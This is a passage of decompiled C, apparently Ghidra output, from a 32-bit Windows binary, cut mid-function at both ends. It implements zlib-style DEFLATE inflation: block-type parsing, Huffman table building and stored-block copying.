      }
      return;
    case 8:
      goto switchD_0040905e_caseD_8;
    case 9:
      *(uint *)(param_1 + 0x20) = local_18;
      *(uint *)(param_1 + 0x1c) = local_1c;
      param_2[1] = local_c;
      param_2[2] = param_2[2] + ((int)local_8 - (int)*param_2);
      *param_2 = local_8;
      *(undefined **)(param_1 + 0x34) = local_14;
      FUN_00408d90(param_1,(int)param_2,-3);
      return;
    default:
      *(uint *)(param_1 + 0x20) = local_18;
      *(uint *)(param_1 + 0x1c) = local_1c;
      param_2[1] = local_c;
      param_2[2] = param_2[2] + ((int)local_8 - (int)*param_2);
      *param_2 = local_8;
      *(undefined **)(param_1 + 0x34) = local_14;
      FUN_00408d90(param_1,(int)param_2,-2);
      return;
    }
  } while( true );
switchD_0040905e_caseD_6:
  if (local_2c == 0) {
    if ((local_14 == *(undefined **)(param_1 + 0x2c)) &&
       (*(int *)(param_1 + 0x30) != *(int *)(param_1 + 0x28))) {
      local_14 = *(undefined **)(param_1 + 0x28);
      if (local_14 < *(undefined **)(param_1 + 0x30)) {
        local_4c = (*(int *)(param_1 + 0x30) - (int)local_14) - 1;
      }
      else {
        local_4c = *(int *)(param_1 + 0x2c) - (int)local_14;
      }
      local_2c = local_4c;
    }
    if (local_2c == 0) {
      *(undefined **)(param_1 + 0x34) = local_14;
      iVar4 = FUN_00408d90(param_1,(int)param_2,param_3);
      local_14 = *(undefined **)(param_1 + 0x34);
      if (local_14 < *(undefined **)(param_1 + 0x30)) {
        local_50 = (*(int *)(param_1 + 0x30) - (int)local_14) - 1;
      }
      else {
        local_50 = *(int *)(param_1 + 0x2c) - (int)local_14;
      }
      local_2c = local_50;
      if ((local_14 == *(undefined **)(param_1 + 0x2c)) &&
         (*(int *)(param_1 + 0x30) != *(int *)(param_1 + 0x28))) {
        local_14 = *(undefined **)(param_1 + 0x28);
        if (local_14 < *(undefined **)(param_1 + 0x30)) {
          local_54 = (*(int *)(param_1 + 0x30) - (int)local_14) - 1;
        }
        else {
          local_54 = *(int *)(param_1 + 0x2c) - (int)local_14;
        }
        local_2c = local_54;
      }
      if (local_2c == 0) {
        *(uint *)(param_1 + 0x20) = local_18;
        *(uint *)(param_1 + 0x1c) = local_1c;
        param_2[1] = local_c;
        param_2[2] = param_2[2] + ((int)local_8 - (int)*param_2);
        *param_2 = local_8;
        *(undefined **)(param_1 + 0x34) = local_14;
        FUN_00408d90(param_1,(int)param_2,iVar4);
        return;
      }
    }
  }
  param_3 = 0;
  *local_14 = *(undefined *)(piVar3 + 2);
  local_14 = local_14 + 1;
  local_2c = local_2c - 1;
  *piVar3 = 0;
  goto LAB_00409049;
}



void __cdecl FUN_00409ce0(undefined4 param_1,int param_2)

{
  (**(code **)(param_2 + 0x24))(*(undefined4 *)(param_2 + 0x28),param_1);
  return;
}



void __cdecl FUN_00409d00(int *param_1,int param_2,int *param_3)

{
  int iVar1;
  
  if (param_3 != (int *)0x0) {
    *param_3 = param_1[0xf];
  }
  if ((*param_1 == 4) || (*param_1 == 5)) {
    (**(code **)(param_2 + 0x24))(*(undefined4 *)(param_2 + 0x28),param_1[3]);
  }
  if (*param_1 == 6) {
    FUN_00409ce0(param_1[1],param_2);
  }
  *param_1 = 0;
  param_1[7] = 0;
  param_1[8] = 0;
  param_1[0xd] = param_1[10];
  param_1[0xc] = param_1[0xd];
  if (param_1[0xe] != 0) {
    iVar1 = (*(code *)param_1[0xe])(0,0,0);
    param_1[0xf] = iVar1;
    *(int *)(param_2 + 0x30) = param_1[0xf];
  }
  return;
}



int * __thiscall FUN_00409dc0(void *this,int param_1,int param_2,int param_3)

{
  int *piVar1;
  int iVar2;
  
  piVar1 = (int *)(**(code **)(param_1 + 0x20))(*(undefined4 *)(param_1 + 0x28),1,0x40,this);
  if (piVar1 != (int *)0x0) {
    iVar2 = (**(code **)(param_1 + 0x20))(*(undefined4 *)(param_1 + 0x28),8,0x5a0);
    piVar1[9] = iVar2;
    if (piVar1[9] == 0) {
      (**(code **)(param_1 + 0x24))(*(undefined4 *)(param_1 + 0x28),piVar1);
      piVar1 = (int *)0x0;
    }
    else {
      iVar2 = (**(code **)(param_1 + 0x20))(*(undefined4 *)(param_1 + 0x28),1,param_3);
      piVar1[10] = iVar2;
      if (piVar1[10] == 0) {
        (**(code **)(param_1 + 0x24))(*(undefined4 *)(param_1 + 0x28),piVar1[9]);
        (**(code **)(param_1 + 0x24))(*(undefined4 *)(param_1 + 0x28),piVar1);
        piVar1 = (int *)0x0;
      }
      else {
        piVar1[0xb] = piVar1[10] + param_3;
        piVar1[0xe] = param_2;
        *piVar1 = 0;
        FUN_00409d00(piVar1,param_1,(int *)0x0);
      }
    }
  }
  return piVar1;
}



// WARNING: Type propagation algorithm not settling

void __cdecl FUN_00409ed0(uint *param_1,byte **param_2,int param_3)

{
  byte bVar1;
  uint uVar2;
  undefined4 *puVar3;
  int iVar4;
  byte *local_80;
  byte *local_7c;
  uint local_78;
  int local_74;
  byte *local_70;
  byte *local_6c;
  byte *local_68;
  uint local_64;
  byte *local_58;
  uint local_50;
  uint local_4c;
  void *local_48;
  uint local_44;
  int local_40;
  uint local_3c;
  uint local_38;
  int local_34;
  void *local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  byte *local_20;
  byte *local_1c;
  uint local_18;
  uint local_14;
  byte *local_10;
  byte *local_c;
  byte *local_8;
  
  local_8 = *param_2;
  local_c = param_2[1];
  local_14 = param_1[8];
  local_18 = param_1[7];
  local_10 = (byte *)param_1[0xd];
  if (local_10 < (byte *)param_1[0xc]) {
    local_58 = (byte *)((param_1[0xc] - (int)local_10) + -1);
  }
  else {
    local_58 = (byte *)(param_1[0xb] - (int)local_10);
  }
  local_20 = local_58;
  do {
    switch(*param_1) {
    case 0:
      for (; local_18 < 3; local_18 = local_18 + 8) {
        if (local_c == (byte *)0x0) {
          param_1[8] = local_14;
          param_1[7] = local_18;
          param_2[1] = (byte *)0x0;
          param_2[2] = param_2[2] + ((int)local_8 - (int)*param_2);
          *param_2 = local_8;
          param_1[0xd] = (uint)local_10;
          FUN_00408d90((int)param_1,(int)param_2,param_3);
          return;
        }
        param_3 = 0;
        local_c = local_c + -1;
        local_14 = (uint)*local_8 << ((byte)local_18 & 0x1f) | local_14;
        local_8 = local_8 + 1;
      }
      local_1c = (byte *)(local_14 & 7);
      param_1[6] = local_14 & 1;
      switch((uint)local_1c >> 1) {
      case 0:
        local_1c = (byte *)(local_18 - 3 & 7);
        local_14 = (local_14 >> 3) >> (sbyte)local_1c;
        local_18 = (local_18 - 3) - (int)local_1c;
        *param_1 = 1;
        break;
      case 1:
        FUN_0040bcf0(&local_28,&local_30,&local_2c,&local_24);
        puVar3 = FUN_00408f80(local_30,(char)local_28,(char)local_30,local_2c,local_24,(int)param_2)
        ;
        param_1[1] = (uint)puVar3;
        if (param_1[1] == 0) {
          param_1[8] = local_14;
          param_1[7] = local_18;
          param_2[1] = local_c;
          param_2[2] = param_2[2] + ((int)local_8 - (int)*param_2);
          *param_2 = local_8;
          param_1[0xd] = (uint)local_10;
          FUN_00408d90((int)param_1,(int)param_2,-4);
          return;
        }
        local_14 = local_14 >> 3;
        local_18 = local_18 - 3;
        *param_1 = 6;
        break;
      case 2:
        local_14 = local_14 >> 3;
        local_18 = local_18 - 3;
        *param_1 = 3;
        break;
      case 3:
        local_14 = local_14 >> 3;
        local_18 = local_18 - 3;
        *param_1 = 9;
        param_2[6] = (byte *)s_invalid_block_type_0042499c;
        param_1[8] = local_14;
        param_1[7] = local_18;
        param_2[1] = local_c;
        param_2[2] = param_2[2] + ((int)local_8 - (int)*param_2);
        *param_2 = local_8;
        param_1[0xd] = (uint)local_10;
        FUN_00408d90((int)param_1,(int)param_2,-3);
        return;
      }
      break;
    case 1:
      for (; local_18 < 0x20; local_18 = local_18 + 8) {
        if (local_c == (byte *)0x0) {
          param_1[8] = local_14;
          param_1[7] = local_18;
          param_2[1] = (byte *)0x0;
          param_2[2] = param_2[2] + ((int)local_8 - (int)*param_2);
          *param_2 = local_8;
          param_1[0xd] = (uint)local_10;
          FUN_00408d90((int)param_1,(int)param_2,param_3);
          return;
        }
        param_3 = 0;
        local_c = local_c + -1;
        local_14 = (uint)*local_8 << ((byte)local_18 & 0x1f) | local_14;
        local_8 = local_8 + 1;
      }
      if (~local_14 >> 0x10 != (local_14 & 0xffff)) {
        *param_1 = 9;
        param_2[6] = (byte *)s_invalid_stored_block_lengths_00425b14;
        param_1[8] = local_14;
        param_1[7] = local_18;
        param_2[1] = local_c;
        param_2[2] = param_2[2] + ((int)local_8 - (int)*param_2);
        *param_2 = local_8;
        param_1[0xd] = (uint)local_10;
        FUN_00408d90((int)param_1,(int)param_2,-3);
        return;
      }
      param_1[1] = local_14 & 0xffff;
      local_18 = 0;
      local_14 = 0;
      if (param_1[1] == 0) {
        local_64 = -(uint)(param_1[6] != 0) & 7;
      }
      else {
        local_64 = 2;
      }
      *param_1 = local_64;
      break;
    case 2:
      if (local_c == (byte *)0x0) {
        param_1[8] = local_14;
        param_1[7] = local_18;
        param_2[1] = (byte *)0x0;
        param_2[2] = param_2[2] + ((int)local_8 - (int)*param_2);
        *param_2 = local_8;
        param_1[0xd] = (uint)local_10;
        FUN_00408d90((int)param_1,(int)param_2,param_3);
        return;
      }
      if (local_20 == (byte *)0x0) {
        if ((local_10 == (byte *)param_1[0xb]) && (param_1[0xc] != param_1[10])) {
          local_10 = (byte *)param_1[10];
          if (local_10 < (byte *)param_1[0xc]) {
            local_68 = (byte *)((param_1[0xc] - (int)local_10) + -1);
          }
          else {
            local_68 = (byte *)(param_1[0xb] - (int)local_10);
          }
          local_20 = local_68;
        }
        if (local_20 == (byte *)0x0) {
          param_1[0xd] = (uint)local_10;
          iVar4 = FUN_00408d90((int)param_1,(int)param_2,param_3);
          local_10 = (byte *)param_1[0xd];
          if (local_10 < (byte *)param_1[0xc]) {
            local_6c = (byte *)((param_1[0xc] - (int)local_10) + -1);
          }
          else {
            local_6c = (byte *)(param_1[0xb] - (int)local_10);
          }
          local_20 = local_6c;
          if ((local_10 == (byte *)param_1[0xb]) && (param_1[0xc] != param_1[10])) {
            local_10 = (byte *)param_1[10];
            if (local_10 < (byte *)param_1[0xc]) {
              local_70 = (byte *)((param_1[0xc] - (int)local_10) + -1);
            }
            else {
              local_70 = (byte *)(param_1[0xb] - (int)local_10);
            }
            local_20 = local_70;
          }
          if (local_20 == (byte *)0x0) {
            param_1[8] = local_14;
            param_1[7] = local_18;
            param_2[1] = local_c;
            param_2[2] = param_2[2] + ((int)local_8 - (int)*param_2);
            *param_2 = local_8;
            param_1[0xd] = (uint)local_10;
            FUN_00408d90((int)param_1,(int)param_2,iVar4);
            return;
          }
        }
      }
      param_3 = 0;
      local_1c = (byte *)param_1[1];
      if (local_c < local_1c) {
        local_1c = local_c;
      }
      if (local_20 < local_1c) {
        local_1c = local_20;
      }
      _memcpy(local_10,local_8,(size_t)local_1c);
      local_8 = local_8 + (int)local_1c;
      local_c = local_c + -(int)local_1c;
      local_10 = local_10 + (int)local_1c;
      local_20 = local_20 + -(int)local_1c;
      param_1[1] = param_1[1] - (int)local_1c;
      if (param_1[1] == 0) {
        *param_1 = -(uint)(param_1[6] != 0) & 7;
      }
      break;
    case 3:
      for (; local_18 < 0xe; local_18 = local_18 + 8) {
        if (local_c == (byte *)0x0) {
          param_1[8] = local_14;
          param_1[7] = local_18;
          param_2[1] = (byte *)0x0;
          param_2[2] = param_2[2] + ((int)local_8 - (int)*param_2);
          *param_2 = local_8;
          param_1[0xd] = (uint)local_10;
          FUN_00408d90((int)param_1,(int)param_2,param_3);
          return;
        }
        param_3 = 0;
        local_c = local_c + -1;
        local_14 = (uint)*local_8 << ((byte)local_18 & 0x1f) | local_14;
        local_8 = local_8 + 1;
      }
      local_1c = (byte *)(local_14 & 0x3fff);
      param_1[1] = (uint)local_1c;
      if ((0x1d < (local_14 & 0x1f)) || (0x1d < ((uint)local_1c >> 5 & 0x1f))) {
        *param_1 = 9;
        param_2[6] = (byte *)s_too_many_length_or_distance_symb_00425b34;
        param_1[8] = local_14;
        param_1[7] = local_18;
        param_2[1] = local_c;
        param_2[2] = param_2[2] + ((int)local_8 - (int)*param_2);
        *param_2 = local_8;
        param_1[0xd] = (uint)local_10;
        FUN_00408d90((int)param_1,(int)param_2,-3);
        return;
      }
      local_1c = (byte *)((local_14 & 0x1f) + 0x102 + ((uint)local_1c >> 5 & 0x1f));
      uVar2 = (*(code *)param_2[8])(param_2[10],local_1c,4);
      param_1[3] = uVar2;
      if (param_1[3] == 0) {
        param_1[8] = local_14;
        param_1[7] = local_18;
        param_2[1] = local_c;
        param_2[2] = param_2[2] + ((int)local_8 - (int)*param_2);
        *param_2 = local_8;
        param_1[0xd] = (uint)local_10;
        FUN_00408d90((int)param_1,(int)param_2,-4);
        return;
      }
      local_14 = local_14 >> 0xe;
      local_18 = local_18 - 0xe;
      param_1[2] = 0;
      *param_1 = 4;
    case 4:
      while (param_1[2] < (param_1[1] >> 10) + 4) {
        for (; local_18 < 3; local_18 = local_18 + 8) {
          if (local_c == (byte *)0x0) {
            param_1[8] = local_14;
            param_1[7] = local_18;
            param_2[1] = (byte *)0x0;
            param_2[2] = param_2[2] + ((int)local_8 - (int)*param_2);
            *param_2 = local_8;
            param_1[0xd] = (uint)local_10;
            FUN_00408d90((int)param_1,(int)param_2,param_3);
            return;
          }
          param_3 = 0;
          local_c = local_c + -1;
          local_14 = (uint)*local_8 << ((byte)local_18 & 0x1f) | local_14;
          local_8 = local_8 + 1;
        }
        *(uint *)(param_1[3] + *(int *)(&DAT_00425ac8 + param_1[2] * 4) * 4) = local_14 & 7;
        param_1[2] = param_1[2] + 1;
        local_14 = local_14 >> 3;
        local_18 = local_18 - 3;
      }
      while (param_1[2] < 0x13) {
        *(undefined4 *)(param_1[3] + *(int *)(&DAT_00425ac8 + param_1[2] * 4) * 4) = 0;
        param_1[2] = param_1[2] + 1;
      }
      param_1[4] = 7;
      iVar4 = FUN_0040bab0((int *)param_1[3],param_1 + 4,param_1 + 5,param_1[9],(int)param_2);
      if (iVar4 != 0) {
        local_1c = (byte *)iVar4;
        if (iVar4 == -3) {
          (*(code *)param_2[9])(param_2[10],param_1[3]);
          *param_1 = 9;
        }
        param_1[8] = local_14;
        param_1[7] = local_18;
        param_2[1] = local_c;
        param_2[2] = param_2[2] + ((int)local_8 - (int)*param_2);
        *param_2 = local_8;
        param_1[0xd] = (uint)local_10;
        FUN_00408d90((int)param_1,(int)param_2,iVar4);
        return;
      }
      param_1[2] = 0;
      *param_1 = 5;
    case 5:
      while (param_1[2] < (param_1[1] & 0x1f) + 0x102 + (param_1[1] >> 5 & 0x1f)) {
        local_1c = (byte *)param_1[4];
        for (; local_18 < local_1c; local_18 = local_18 + 8) {
          if (local_c == (byte *)0x0) {
            param_1[8] = local_14;
            param_1[7] = local_18;
            param_2[1] = (byte *)0x0;
            param_2[2] = param_2[2] + ((int)local_8 - (int)*param_2);
            *param_2 = local_8;
            param_1[0xd] = (uint)local_10;
            FUN_00408d90((int)param_1,(int)param_2,param_3);
            return;
          }
          param_3 = 0;
          local_c = local_c + -1;
          local_14 = (uint)*local_8 << ((byte)local_18 & 0x1f) | local_14;
          local_8 = local_8 + 1;
        }
        local_34 = param_1[5] + (local_14 & *(uint *)(&DAT_00424958 + (int)local_1c * 4)) * 8;
        bVar1 = *(byte *)(local_34 + 1);
        local_1c = (byte *)(uint)bVar1;
        local_3c = *(uint *)(local_34 + 4);
        if (local_3c < 0x10) {
          local_14 = local_14 >> (bVar1 & 0x1f);
          local_18 = local_18 - (int)local_1c;
          *(uint *)(param_1[3] + param_1[2] * 4) = local_3c;
          param_1[2] = param_1[2] + 1;
        }
        else {
          if (local_3c == 0x12) {
            local_74 = 7;
          }
          else {
            local_74 = local_3c - 0xe;
          }
          local_38 = local_74;
          local_40 = (uint)(local_3c == 0x12) * 8 + 3;
          for (; local_18 < (uint)((int)local_1c + local_74); local_18 = local_18 + 8) {
            if (local_c == (byte *)0x0) {
              param_1[8] = local_14;
              param_1[7] = local_18;
              param_2[1] = (byte *)0x0;
              param_2[2] = param_2[2] + ((int)local_8 - (int)*param_2);
              *param_2 = local_8;
              param_1[0xd] = (uint)local_10;
              FUN_00408d90((int)param_1,(int)param_2,param_3);
              return;
            }
            param_3 = 0;
            local_c = local_c + -1;
            local_14 = (uint)*local_8 << ((byte)local_18 & 0x1f) | local_14;
            local_8 = local_8 + 1;
          }
          local_14 = local_14 >> (bVar1 & 0x1f);
          local_40 = (local_14 & *(uint *)(&DAT_00424958 + local_74 * 4)) + local_40;
          local_14 = local_14 >> ((byte)local_74 & 0x1f);
          local_18 = (local_18 - (int)local_1c) - local_74;
          local_38 = param_1[2];
          local_1c = (byte *)param_1[1];
          if ((((uint)local_1c & 0x1f) + 0x102 + ((uint)local_1c >> 5 & 0x1f) < local_38 + local_40)
             || ((local_3c == 0x10 && (local_38 == 0)))) {
            (*(code *)param_2[9])(param_2[10],param_1[3]);
            *param_1 = 9;
            param_2[6] = (byte *)s_invalid_bit_length_repeat_00425b58;
            param_1[8] = local_14;
            param_1[7] = local_18;
            param_2[1] = local_c;
            param_2[2] = param_2[2] + ((int)local_8 - (int)*param_2);
            *param_2 = local_8;
            param_1[0xd] = (uint)local_10;
            FUN_00408d90((int)param_1,(int)param_2,-3);
            return;
          }
          if (local_3c == 0x10) {
            local_78 = *(uint *)((param_1[3] - 4) + local_38 * 4);
          }
          else {
            local_78 = 0;
          }
          local_3c = local_78;
          do {
            *(uint *)(param_1[3] + local_38 * 4) = local_78;
            local_38 = local_38 + 1;
            local_40 = local_40 + -1;
          } while (local_40 != 0);
          param_1[2] = local_38;
          local_40 = 0;
        }
      }
      param_1[5] = 0;
      local_48 = (void *)0x9;
      local_50 = 6;
      local_1c = (byte *)param_1[1];
      local_1c = (byte *)FUN_0040bb60(((uint)local_1c & 0x1f) + 0x101,
                                      ((uint)local_1c >> 5 & 0x1f) + 1,(int *)param_1[3],
                                      (uint *)&local_48,&local_50,&local_4c,&local_44,param_1[9],
                                      (int)param_2);
      if (local_1c != (byte *)0x0) {
        if (local_1c == (byte *)0xfffffffd) {
          (*(code *)param_2[9])(param_2[10],param_1[3]);
          *param_1 = 9;
        }
        param_1[8] = local_14;
        param_1[7] = local_18;
        param_2[1] = local_c;
        param_2[2] = param_2[2] + ((int)local_8 - (int)*param_2);
        *param_2 = local_8;
        param_1[0xd] = (uint)local_10;
        FUN_00408d90((int)param_1,(int)param_2,(int)local_1c);
        return;
      }
      puVar3 = FUN_00408f80(local_48,(char)local_48,(char)local_50,local_4c,local_44,(int)param_2);
      if (puVar3 == (undefined4 *)0x0) {
        param_1[8] = local_14;
        param_1[7] = local_18;
        param_2[1] = local_c;
        param_2[2] = param_2[2] + ((int)local_8 - (int)*param_2);
        *param_2 = local_8;
        param_1[0xd] = (uint)local_10;
        FUN_00408d90((int)param_1,(int)param_2,-4);
        return;
      }
      param_1[1] = (uint)puVar3;
      (*(code *)param_2[9])(param_2[10],param_1[3]);
      *param_1 = 6;
    case 6:
      param_1[8] = local_14;
      param_1[7] = local_18;
      param_2[1] = local_c;
      param_2[2] = param_2[2] + ((int)local_8 - (int)*param_2);
      *param_2 = local_8;
      param_1[0xd] = (uint)local_10;
      iVar4 = FUN_00408fe0((int)param_1,param_2,param_3);
      if (iVar4 != 1) {
        FUN_00408d90((int)param_1,(int)param_2,iVar4);
        return;
      }
      param_3 = 0;
      FUN_00409ce0(param_1[1],(int)param_2);
      local_8 = *param_2;
      local_c = param_2[1];
      local_14 = param_1[8];
      local_18 = param_1[7];
      local_10 = (byte *)param_1[0xd];
      if (local_10 < (byte *)param_1[0xc]) {
        local_7c = (byte *)((param_1[0xc] - (int)local_10) + -1);
      }
      else {
        local_7c = (byte *)(param_1[0xb] - (int)local_10);
      }
      local_20 = local_7c;
      if (param_1[6] != 0) {
        *param_1 = 7;
switchD_00409f45_caseD_7:
        param_1[0xd] = (uint)local_10;
        iVar4 = FUN_00408d90((int)param_1,(int)param_2,param_3);
        local_10 = (byte *)param_1[0xd];
        if (local_10 < (byte *)param_1[0xc]) {
          local_80 = (byte *)((param_1[0xc] - (int)local_10) + -1);
        }
        else {
          local_80 = (byte *)(param_1[0xb] - (int)local_10);
        }
        local_20 = local_80;
        if (param_1[0xc] != param_1[0xd]) {
          param_1[8] = local_14;
          param_1[7] = local_18;
          param_2[1] = local_c;
          param_2[2] = param_2[2] + ((int)local_8 - (int)*param_2);
          *param_2 = local_8;
          param_1[0xd] = (uint)local_10;
          FUN_00408d90((int)param_1,(int)param_2,iVar4);
          return;
        }
        *param_1 = 8;
        goto switchD_00409f45_caseD_8;
      }
      *param_1 = 0;
      break;
    case 7:
      goto switchD_00409f45_caseD_7;
    case 8:
switchD_00409f45_caseD_8:
      param_1[8] = local_14;
      param_1[7] = local_18;
      param_2[1] = local_c;
      param_2[2] = param_2[2] + ((int)local_8 - (int)*param_2);
      *param_2 = local_8;
      param_1[0xd] = (uint)local_10;
      FUN_00408d90((int)param_1,(int)param_2,1);
      return;
    case 9:
      param_1[8] = local_14;
      param_1[7] = local_18;
      param_2[1] = local_c;
      param_2[2] = param_2[2] + ((int)local_8 - (int)*param_2);
      *param_2 = local_8;
      param_1[0xd] = (uint)local_10;
      FUN_00408d90((int)param_1,(int)param_2,-3);
      return;
    default:
      param_1[8] = local_14;
      param_1[7] = local_18;
      param_2[1] = local_c;
      param_2[2] = param_2[2] + ((int)local_8 - (int)*param_2);
      *param_2 = local_8;
      param_1[0xd] = (uint)local_10;
      FUN_00408d90((int)param_1,(int)param_2,-2);
      return;
    }
  } while( true );
}



undefined4 __cdecl FUN_0040b220(int *param_1,int param_2)

{
  FUN_00409d00(param_1,param_2,(int *)0x0);
  (**(code **)(param_2 + 0x24))(*(undefined4 *)(param_2 + 0x28),param_1[10]);
  (**(code **)(param_2 + 0x24))(*(undefined4 *)(param_2 + 0x28),param_1[9]);
  (**(code **)(param_2 + 0x24))(*(undefined4 *)(param_2 + 0x28),param_1);
  return 0;
}



undefined4 __cdecl
FUN_0040b290(int *param_1,uint param_2,uint param_3,int param_4,int param_5,uint *param_6,
            uint *param_7,int param_8,int *param_9,uint *param_10)

{
  int iVar1;
  uint uVar2;
  uint uVar3;
  char cVar4;
  byte bVar5;
  undefined3 uVar6;
  uint uVar7;
  uint uVar8;
  undefined4 local_110;
  uint local_10c;
  uint local_108;
  uint local_104 [17];
  undefined4 local_c0;
  uint local_bc;
  uint local_b8;
  uint local_b4;
  uint local_b0;
  uint local_ac;
  uint local_a8;
  uint local_a4;
  uint local_a0 [16];
  uint local_60;
  uint *local_5c;
  uint local_58;
  uint local_54 [16];
  int local_14;
  int local_10;
  uint *local_c;
  int local_8;
  
  local_104[0] = 0;
  local_104[1] = 0;
  local_104[2] = 0;
  local_104[3] = 0;
  local_104[4] = 0;
  local_104[5] = 0;
  local_104[6] = 0;
  local_104[7] = 0;
  local_104[8] = 0;
  local_104[9] = 0;
  local_104[10] = 0;
  local_104[11] = 0;
  local_104[12] = 0;
  local_104[13] = 0;
  local_104[14] = 0;
  local_104[15] = 0;
  local_c = (uint *)param_1;
  local_60 = param_2;
  do {
    local_104[*local_c] = local_104[*local_c] + 1;
    local_c = local_c + 1;
    local_60 = local_60 - 1;
  } while (local_60 != 0);
  if (local_104[0] == param_2) {
    *param_6 = 0;
    *param_7 = 0;
    local_110 = 0;
  }
  else {
    local_b8 = *param_7;
    for (local_108 = 1; (local_108 < 0x10 && (local_104[local_108] == 0)); local_108 = local_108 + 1
        ) {
    }
    local_b4 = local_108;
    if (*param_7 < local_108) {
      local_b8 = local_108;
    }
    for (local_60 = 0xf; (uVar7 = local_60, local_60 != 0 && (local_104[local_60] == 0));
        local_60 = local_60 - 1) {
    }
    local_ac = local_60;
    if (local_60 < local_b8) {
      local_b8 = local_60;
    }
    *param_7 = local_b8;
    local_14 = 1 << ((byte)local_108 & 0x1f);
    for (; local_108 < local_60; local_108 = local_108 + 1) {
      if ((int)(local_14 - local_104[local_108]) < 0) {
        return 0xfffffffd;
      }
      local_14 = (local_14 - local_104[local_108]) * 2;
    }
    local_14 = local_14 - local_104[local_60];
    if (local_14 < 0) {
      local_110 = 0xfffffffd;
    }
    else {
      local_104[local_60] = local_104[local_60] + local_14;
      local_108 = 0;
      local_54[1] = 0;
      local_c = local_104;
      local_5c = local_54 + 2;
      while( true ) {
        local_c = local_c + 1;
        local_60 = local_60 - 1;
        if (local_60 == 0) break;
        local_108 = local_108 + *local_c;
        *local_5c = local_108;
        local_5c = local_5c + 1;
      }
      local_c = (uint *)param_1;
      local_60 = 0;
      do {
        iVar1 = *local_c;
        local_c = local_c + 1;
        if (iVar1 != 0) {
          param_10[local_54[iVar1]] = local_60;
          local_54[iVar1] = local_54[iVar1] + 1;
        }
        local_60 = local_60 + 1;
      } while (local_60 < param_2);
      uVar2 = local_54[uVar7];
      local_60 = 0;
      local_54[0] = 0;
      local_c = param_10;
      local_10 = -1;
      local_8 = -local_b8;
      local_a0[1] = 0;
      local_a8 = 0;
      local_b0 = 0;
      for (; (int)local_b4 <= (int)uVar7; local_b4 = local_b4 + 1) {
        local_58 = local_104[local_b4];
        while (uVar3 = local_58, local_58 = local_58 - 1, uVar3 != 0) {
          while (iVar1 = local_10, (int)(local_8 + local_b8) < (int)local_b4) {
            local_10 = local_10 + 1;
            local_8 = local_8 + local_b8;
            local_10c = uVar7 - local_8;
            if (local_b8 < local_10c) {
              local_10c = local_b8;
            }
            local_108 = local_b4 - local_8;
            local_a4 = 1 << ((byte)local_108 & 0x1f);
            if (local_58 + 1 < local_a4) {
              local_a4 = local_a4 - (local_58 + 1);
              local_5c = local_104 + local_b4;
              if (local_108 < local_10c) {
                while (local_108 = local_108 + 1, local_108 < local_10c) {
                  local_a4 = local_a4 * 2;
                  local_5c = local_5c + 1;
                  if (local_a4 <= *local_5c) break;
                  local_a4 = local_a4 - *local_5c;
                }
              }
            }
            local_b0 = 1 << ((byte)local_108 & 0x1f);
            if (0x5a0 < *param_9 + local_b0) {
              return 0xfffffffd;
            }
            local_a8 = param_8 + *param_9 * 8;
            local_a0[iVar1 + 2] = local_a8;
            *param_9 = *param_9 + local_b0;
            if (local_10 == 0) {
              *param_6 = local_a8;
            }
            else {
              local_54[local_10] = local_60;
              local_c0 = CONCAT31(CONCAT21(local_c0._2_2_,(char)local_b8),(byte)local_108);
              uVar8 = local_60 >> ((char)local_8 - (char)local_b8 & 0x1fU);
              local_bc = ((int)(local_a8 - local_a0[local_10]) >> 3) - uVar8;
              uVar3 = local_a0[local_10];
              *(undefined4 *)(uVar3 + uVar8 * 8) = local_c0;
              *(uint *)(uVar3 + 4 + uVar8 * 8) = local_bc;
            }
          }
          bVar5 = (byte)local_8;
          cVar4 = (char)local_b4;
          uVar6 = CONCAT21(local_c0._2_2_,cVar4 - bVar5);
          if (local_c < param_10 + uVar2) {
            if (*local_c < param_3) {
              local_c0 = CONCAT31(uVar6,(-(*local_c < 0x100) & 0xa0U) + 0x60);
              local_bc = *local_c;
              local_c = local_c + 1;
            }
            else {
              local_c0 = CONCAT31(uVar6,(char)*(undefined4 *)(param_5 + (*local_c - param_3) * 4) +
                                        'P');
              local_bc = *(uint *)(param_4 + (*local_c - param_3) * 4);
              local_c = local_c + 1;
            }
          }
          else {
            local_c0 = CONCAT31(uVar6,0xc0);
          }
          local_a4 = 1 << (cVar4 - bVar5 & 0x1f);
          for (local_108 = local_60 >> (bVar5 & 0x1f); local_108 < local_b0;
              local_108 = local_108 + local_a4) {
            *(undefined4 *)(local_a8 + local_108 * 8) = local_c0;
            *(uint *)(local_a8 + 4 + local_108 * 8) = local_bc;
          }
          local_108 = 1 << (cVar4 - 1U & 0x1f);
          while ((local_60 & local_108) != 0) {
            local_60 = local_60 ^ local_108;
            local_108 = local_108 >> 1;
          }
          local_60 = local_60 ^ local_108;
          local_a0[0] = (1 << (bVar5 & 0x1f)) - 1;
          while ((local_60 & local_a0[0]) != local_54[local_10]) {
            local_10 = local_10 + -1;
            local_8 = local_8 - local_b8;
            local_a0[0] = (1 << ((byte)local_8 & 0x1f)) - 1;
          }
        }
      }
      if ((local_14 == 0) || (uVar7 == 1)) {
        local_110 = 0;
      }
      else {
        local_110 = 0xfffffffb;
      }
    }
  }
  return local_110;
}



int __cdecl FUN_0040bab0(int *param_1,uint *param_2,uint *param_3,int param_4,int param_5)

{
  int local_10;
  int local_c;
  uint *local_8;
  
  local_c = 0;
  local_8 = (uint *)(**(code **)(param_5 + 0x20))(*(undefined4 *)(param_5 + 0x28),0x13,4);
  if (local_8 == (uint *)0x0) {
    local_10 = -4;
  }
  else {
    local_10 = FUN_0040b290(param_1,0x13,0x13,0,0,param_3,param_2,param_4,&local_c,local_8);
    if (local_10 == -3) {
      *(char **)(param_5 + 0x18) = s_oversubscribed_dynamic_bit_lengt_00425dd8;
    }
    else if ((local_10 == -5) || (*param_2 == 0)) {
      *(char **)(param_5 + 0x18) = s_incomplete_dynamic_bit_lengths_t_00425c24;
      local_10 = -3;
    }
    (**(code **)(param_5 + 0x24))(*(undefined4 *)(param_5 + 0x28),local_8);
  }
  return local_10;
}



int __cdecl
FUN_0040bb60(uint param_1,uint param_2,int *param_3,uint *param_4,uint *param_5,uint *param_6,
            uint *param_7,int param_8,int param_9)

{
  int local_10;
  int local_c;
  uint *local_8;
  
  local_c = 0;
  local_8 = (uint *)(**(code **)(param_9 + 0x20))(*(undefined4 *)(param_9 + 0x28),0x120,4);
  if (local_8 == (uint *)0x0) {
    local_10 = -4;
  }
  else {
    local_10 = FUN_0040b290(param_3,param_1,0x101,0x425ba8,0x425c48,param_6,param_4,param_8,&local_c
